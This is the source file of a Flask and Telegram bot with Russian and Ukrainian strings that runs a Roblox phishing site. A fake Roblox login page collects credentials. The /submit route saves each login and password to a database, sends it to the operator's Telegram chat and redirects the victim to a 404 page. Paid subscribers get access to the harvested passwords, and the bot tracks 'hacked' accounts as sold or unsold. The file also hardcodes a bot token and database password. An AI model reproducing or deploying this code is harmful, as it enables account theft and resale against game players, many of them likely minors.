from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Настройки ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # Ваш токен
ADMIN_CHAT_ID = '6956377285'  # Ваш chat_id (Создатель)
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Змінні для техперериву ===
tech_break = None

# === Ініціалізація бази даних ===
def get_db_connection():
    try:
        conn = psycopg2.connect(DATABASE_URL)
        print("DB connection successful")
        return conn
    except Exception as e:
        print(f"DB connection failed: {e}")
        return None

def init_db():
    conn = get_db_connection()
    if conn is None:
        print("Failed to initialize DB - proceeding without DB")
        return False
    try:
        c = conn.cursor()
        print("Creating table 'users' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                     (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT, site_clicks INTEGER DEFAULT 0, password_views INTEGER DEFAULT 0)''')
        print("Creating table 'credentials' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                     (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
        print("Creating table 'hacked_accounts' if not exists")
        c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                     (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
        subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()
        print(f"Ensuring Создатель for {ADMIN_CHAT_ID}")
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = EXCLUDED.prefix, subscription_end = EXCLUDED.subscription_end",
                  (ADMIN_CHAT_ID, "Создатель", subscription_end))
        conn.commit()
        conn.close()
        print("DB initialized successfully")
        return True
    except Exception as e:
        print(f"DB initialization error: {e}")
        conn.close()
        return False

# === Keep-alive для Render ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("🔁 Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === Функції для роботи з базою ===
def get_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print(f"Failed to get user {chat_id}: no DB connection")
        if chat_id == ADMIN_CHAT_ID:
            print(f"Hardcoding Создатель for {chat_id}")
            return {
                'prefix': 'Создатель',
                'subscription_end': datetime.now() + timedelta(days=3650),
                'site_clicks': 0,
                'password_views': 0
            }
        return None
    try:
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end, site_clicks, password_views FROM users WHERE chat_id = %s", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            print(f"User {chat_id} found: {result}")
            return {
                'prefix': result[0],
                'subscription_end': datetime.fromisoformat(result[1]) if result[1] else None,
                'site_clicks': result[2],
                'password_views': result[3]
            }
        print(f"User {chat_id} not found")
        return None
    except Exception as e:
        print(f"Error in get_user for {chat_id}: {e}")
        conn.close()
        return None

def save_user(chat_id, prefix, subscription_end):
    conn = get_db_connection()
    if conn is None:
        print(f"Failed to save user {chat_id}: no DB connection")
        return
    try:
        c = conn.cursor()
        c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
                  "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
                  (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
        conn.commit()
        conn.close()
        print(f"User {chat_id} saved with prefix {prefix}")
    except Exception as e:
        print(f"Error saving user {chat_id}: {e}")
        conn.close()

def save_credentials(login, password):
    conn = get_db_connection()
    if conn is None:
        print("Failed to save credentials: no DB connection")
        return False
    try:
        c = conn.cursor()
        c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, added_time = %s",
                  (login, password, datetime.now().isoformat(), password, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        print(f"Credentials saved: login={login}, password={password}")
        return True
    except Exception as e:
        print(f"Error saving credentials: {e}")
        conn.close()
        return False

def delete_credentials(login):
    conn = get_db_connection()
    if conn is None:
        print("Failed to delete credentials: no DB connection")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"Credentials deleted: login={login}")
        return True
    except Exception as e:
        print(f"Error deleting credentials: {e}")
        conn.close()
        return False

def save_hacked_account(login, password, prefix, sold_status, linked_chat_id):
    conn = get_db_connection()
    if conn is None:
        print("Failed to save hacked account: no DB connection")
        return False
    try:
        c = conn.cursor()
        c.execute("INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) "
                  "VALUES (%s, %s, %s, %s, %s, %s) "
                  "ON CONFLICT (login) DO UPDATE SET password = %s, hack_date = %s, prefix = %s, sold_status = %s, linked_chat_id = %s",
                  (login, password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id,
                   password, datetime.now().isoformat(), prefix, sold_status, linked_chat_id))
        conn.commit()
        conn.close()
        print(f"Hacked account saved: login={login}, password={password}, sold_status={sold_status}")
        return True
    except Exception as e:
        print(f"Error saving hacked account: {e}")
        conn.close()
        return False

def delete_hacked_account(login):
    conn = get_db_connection()
    if conn is None:
        print("Failed to delete hacked account: no DB connection")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
        conn.commit()
        conn.close()
        print(f"Hacked account deleted: login={login}")
        return True
    except Exception as e:
        print(f"Error deleting hacked account: {e}")
        conn.close()
        return False

def delete_user(chat_id):
    conn = get_db_connection()
    if conn is None:
        print("Failed to delete user: no DB connection")
        return False
    try:
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
        conn.commit()
        conn.close()
        print(f"User deleted: chat_id={chat_id}")
        return True
    except Exception as e:
        print(f"Error deleting user: {e}")
        conn.close()
        return False

def get_credentials():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get credentials: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        print(f"Credentials fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching credentials: {e}")
        conn.close()
        return []

def get_hacked_accounts():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get hacked accounts: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        print(f"Hacked accounts fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching hacked accounts: {e}")
        conn.close()
        return []

def get_all_users():
    conn = get_db_connection()
    if conn is None:
        print("Failed to get all users: no DB connection")
        return []
    try:
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
        result = c.fetchall()
        conn.close()
        print(f"All users fetched: {result}")
        return result
    except Exception as e:
        print(f"Error fetching all users: {e}")
        conn.close()
        return []

# === Перевірка доступу ===
def check_access(chat_id, command):
    global tech_break
    print(f"Checking access for {chat_id} on command {command}")
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - datetime.now()).total_seconds() / 60
        if time_left > 0:
            return f"⏳ Сейчас проходит техперерыв. Конец будет через {int(time_left)} минут."
    user = get_user(chat_id)
    if not user or user['prefix'] == 'Посетитель':
        return "🔒 Вы можете купить подписку у @sacoectasy."
    if user['subscription_end'] and user['subscription_end'] < datetime.now():
        save_user(chat_id, 'Посетитель', datetime.now())
        return "🔒 Ваша подписка истекла! Купите новую у @sacoectasy."
    if command in ['passwords', 'admin'] and user['prefix'] not in ['Админ', 'Создатель']:
        return "🔒 Доступно только для Админа и Создателя!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != 'Создатель':
        return "🔒 Доступно только для Создателя!"
    print(f"Access granted for {chat_id} on {command}")
    return None

# === Flask маршрути ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            print(f"Received login: {login}, password: {password}")
            if save_credentials(login, password):
                bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
            else:
                print("Failed to save credentials to DB")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Error in /submit: {e}")
        return "Internal Server Error", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        print(f"Received webhook data: {json_string}")
        update = telebot.types.Update.de_json(json_string)
        if update and (update.message or update.callback_query):
            print(f"Processing update: {update}")
            bot.process_new_updates([update])
        else:
            print("No valid update found in webhook data")
        return 'OK', 200
    print("Invalid webhook request")
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    try:
        bot.remove_webhook()
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        init_db()
        print(f"Webhook set to {webhook_url}")
        return "Webhook and DB set", 200
    except Exception as e:
        print(f"Setup failed: {e}")
        return f"Setup failed: {e}", 500

# === Команди бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /start for chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "✅ Бот активен! Используйте /menu для списка команд.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /menu for chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        print(f"Access denied for {chat_id}: {access}")
        bot.reply_to(message, access)
        return
    
    user = get_user(chat_id)
    print(f"User data for {chat_id}: {user}")
    
    if user:
        time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
        time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
        
        global tech_break
        if tech_break:
            tech_time_left = (tech_break - datetime.now()).total_seconds() / 60
            print(f"Tech break active, time left: {tech_time_left} minutes")
            if tech_time_left > 0:
                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+2), осталось {int(tech_time_left)} мин."
            else:
                tech_break = None
                print("Tech break expired, resetting to None")
        
        response += "\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
        if user['prefix'] in ['Админ', 'Создатель']:
            response += "\n/passwords\n/admin"
        if user['prefix'] == 'Создатель':
            response += "\n/hacked\n/database\n/adprefix\n/delprefix"
    else:
        response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
        print(f"No user found for {chat_id}, showing basic menu")
    
    print(f"Sending response to {chat_id}: {response}")
    bot.reply_to(message, response)

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /site for chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /getchatid for chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstop for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
        return
    minutes = int(args[0])
    tech_break = datetime.now() + timedelta(minutes=minutes, hours=2)
    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')} (UTC+2)")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstopoff for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    tech_break = None
    bot.reply_to(message, "✅ Техперерыв отключен.")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /passwords for chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        bot.reply_to(message, access)
        return
    credentials = get_credentials()
    if not credentials:
        bot.reply_to(message, "📂 Список паролей пуст.")
        return
    response = "🔑 Список паролей:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, added_time in credentials:
        response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
        markup.add(
            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_cred_{login}"),
            types.InlineKeyboardButton(f"Взломать {login}", callback_data=f"hack_cred_{login}")
        )
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /hacked for chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
        bot.reply_to(message, "📂 Список взломанных аккаунтов пуст.", reply_markup=markup)
        return
    response = "🔓 Взломанные аккаунты:\n"
    markup = types.InlineKeyboardMarkup()
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        response += (f"Логин: {login} | Пароль: {password} | Дата: {hack_date} | "
                     f"Префикс: {prefix} | Статус: {sold_status} | Chat ID: {linked_chat_id}\n")
        markup.add(
            types.InlineKeyboardButton(f"Удалить {login}", callback_data=f"delete_hacked_{login}")
        )
    markup.add(types.InlineKeyboardButton("Добавить взломанный аккаунт", callback_data="add_hacked"))
    bot.reply_to(message, response, reply_markup=markup)

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /database for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    
    response = "📊 База данных:\n\n"
    
    # Користувачі
    users = get_all_users()
    response += "👤 Користувачі:\n"
    if not users:
        response += "Порожньо\n"
    else:
        for chat_id, prefix, subscription_end, site_clicks, password_views in users:
            time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
            response += f"Chat ID: {chat_id} | Префікс: {prefix} | Підписка: {time_left} днів\n"
    
    # Паролі
    credentials = get_credentials()
    response += "\n🔑 Паролі:\n"
    if not credentials:
        response += "Порожньо\n"
    else:
        for login, password, added_time in credentials:
            response += f"Логин: {login} | Пароль: {password} | Добавлен: {added_time}\n"
    
    # Взломані акаунти
    hacked_accounts = get_hacked_accounts()
    response += "\n🔓 Взломані акаунти:\n"
    if not hacked_accounts:
        response += "Порожньо\n"
    else:
        for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
            response += f"Логин: {login} | Пароль: {password} | Статус: {sold_status}\n"

    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Додати", callback_data="db_add"),
        types.InlineKeyboardButton("Видалити", callback_data="db_delete"),
        types.InlineKeyboardButton("Переглянути", callback_data="db_view")
    )
    bot.reply_to(message, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("db_"))
def handle_db_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Processing database callback for chat_id: {chat_id}, data: {call.data}")
    
    if call.data == "db_add":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("Додати користувача", callback_data="db_add_user"),
            types.InlineKeyboardButton("Додати пароль", callback_data="db_add_cred"),
            types.InlineKeyboardButton("Додати взломаний", callback_data="db_add_hacked")
        )
        bot.edit_message_text("📊 Виберіть, що додати:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_delete":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("Видалити користувача", callback_data="db_del_user"),
            types.InlineKeyboardButton("Видалити пароль", callback_data="db_del_cred"),
            types.InlineKeyboardButton("Видалити взломаний", callback_data="db_del_hacked")
        )
        bot.edit_message_text("📊 Виберіть, що видалити:", chat_id, call.message.message_id, reply_markup=markup)
    
    elif call.data == "db_view":
        bot.edit_message_text("📊 Ви вже переглядаєте базу даних!", chat_id, call.message.message_id)
    
    # Додавання
    elif call.data == "db_add_user":
        bot.edit_message_text("📝 Введіть: /adduser <chat_id> <префікс> <дні>", chat_id, call.message.message_id)
    elif call.data == "db_add_cred":
        bot.edit_message_text("📝 Введіть: /addcred <логін> <пароль>", chat_id, call.message.message_id)
    elif call.data == "db_add_hacked":
        bot.edit_message_text("📝 Введіть: /addhacked <логін> <пароль>", chat_id, call.message.message_id)
    
    # Видалення
    elif call.data == "db_del_user":
        users = get_all_users()
        if not users:
            bot.edit_message_text("📂 Користувачів немає.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for chat_id_user, prefix, _, _, _ in users:
                markup.add(types.InlineKeyboardButton(f"{chat_id_user} ({prefix})", callback_data=f"db_del_user_{chat_id_user}"))
            bot.edit_message_text("📊 Виберіть користувача для видалення:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_cred":
        credentials = get_credentials()
        if not credentials:
            bot.edit_message_text("📂 Паролів немає.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _ in credentials:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_cred_{login}"))
            bot.edit_message_text("📊 Виберіть пароль для видалення:", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data == "db_del_hacked":
        hacked_accounts = get_hacked_accounts()
        if not hacked_accounts:
            bot.edit_message_text("📂 Взломаних акаунтів немає.", chat_id, call.message.message_id)
        else:
            markup = types.InlineKeyboardMarkup()
            for login, _, _, _, _, _ in hacked_accounts:
                markup.add(types.InlineKeyboardButton(f"{login}", callback_data=f"db_del_hacked_{login}"))
            bot.edit_message_text("📊 Виберіть взломаний акаунт для видалення:", chat_id, call.message.message_id, reply_markup=markup)
    
    # Виконання видалення
    elif call.data.startswith("db_del_user_"):
        chat_id_user = call.data[len("db_del_user_"):]
        if delete_user(chat_id_user):
            bot.edit_message_text(f"✅ Користувач {chat_id_user} видалений.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_cred_"):
        login = call.data[len("db_del_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"✅ Логін {login} видалений.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)
    elif call.data.startswith("db_del_hacked_"):
        login = call.data[len("db_del_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"✅ Логін {login} видалений із взломаних.", chat_id, call.message.message_id)
        else:
            bot.edit_message_text("❌ Помилка при видаленні.", chat_id, call.message.message_id)

@bot.message_handler(commands=['adduser'])
def add_user_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /adduser for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adduser <chat_id> <префікс> <дні>")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    subscription_end = datetime.now() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Додано користувача {target_chat_id} з префіксом {prefix} на {days} днів.")

@bot.message_handler(commands=['addcred'])
def add_cred_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /addcred for chat_id: {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "❌ Формат: /addcred <логін> <пароль>")
        return
    login, password = args[0], args[1]
    if save_credentials(login, password):
        bot.reply_to(message, f"✅ Додано логін {login} з паролем {password}.")
    else:
        bot.reply_to(message, "❌ Помилка при додаванні.")

@bot.message_handler(commands=['addhacked'])
def add_hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /addhacked for chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        bot.reply_to(message, "❌ Формат: /addhacked <логін> <пароль>")
        return
    login, password = args[0], args[1]
    user = get_user(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("Продан", callback_data=f"hack_{login}_{password}_Продан_{chat_id}"),
        types.InlineKeyboardButton("Не продан", callback_data=f"hack_{login}_{password}_Не продан_{chat_id}")
    )
    bot.reply_to(message, f"🔓 Укажите статус для {login}:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_"))
def handle_hack_callback(call):
    chat_id = str(call.message.chat.id)
    parts = call.data.split("_")
    login, password, sold_status, linked_chat_id = parts[1], parts[2], parts[3], parts[4]
    user = get_user(chat_id)
    if save_hacked_account(login, password, user['prefix'], sold_status, linked_chat_id):
        bot.edit_message_text(f"✅ {login} додано до взломаних зі статусом {sold_status}.", 
                             chat_id, call.message.message_id)
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id, "❌ Помилка при додаванні.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("delete_"))
def handle_delete_callback(call):
    chat_id = str(call.message.chat.id)
    print(f"Processing callback for chat_id: {chat_id}, data: {call.data}")
    
    if call.data.startswith("delete_cred_"):
        login = call.data[len("delete_cred_"):]
        if delete_credentials(login):
            bot.edit_message_text(f"✅ Логин {login} удален из списка паролей.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")
    
    elif call.data.startswith("delete_hacked_"):
        login = call.data[len("delete_hacked_"):]
        if delete_hacked_account(login):
            bot.edit_message_text(f"✅ Логин {login} удален из списка взломанных.", 
                                 chat_id, call.message.message_id)
            bot.answer_callback_query(call.id)
        else:
            bot.answer_callback_query(call.id, "❌ Ошибка при удалении.")

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /admin for chat_id: {chat_id}")
    access = check_access(chat_id, 'admin')
    if access:
        bot.reply_to(message, access)
        return
    users = get_all_users()
    if not users:
        bot.reply_to(message, "📂 Список пользователей пуст.")
        return
    response = "👑 Панель администратора\nСписок пользователей:\n"
    for chat_id, prefix, subscription_end, site_clicks, password_views in users:
        time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
        response += (f"Chat ID: {chat_id}\n"
                     f"Префикс: {prefix}\n"
                     f"Подписка: {time_left} дней\n"
                     f"Кликов на сайт: {site_clicks}\n"
                     f"Просмотров паролей: {password_views}\n\n")
    bot.reply_to(message, response)

@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /adprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) < 3 or not args[2].isdigit():
        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПрефиксы: Админ, Пользователь")
        return
    target_chat_id, prefix, days = args[0], args[1], int(args[2])
    if prefix not in ["Админ", "Пользователь"]:
        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь")
        return
    subscription_end = datetime.now() + timedelta(days=days)
    save_user(target_chat_id, prefix, subscription_end)
    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс {prefix} на {days} дней.")

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /delprefix for chat_id: {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        bot.reply_to(message, "❌ Формат: /delprefix <chat_id>")
        return
    target_chat_id = args[0]
    save_user(target_chat_id, "Посетитель", datetime.now())
    bot.reply_to(message, f"✅ Префикс пользователя {target_chat_id} сброшен до Посетитель.")

init_db()  # Ініціалізація при запуску

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
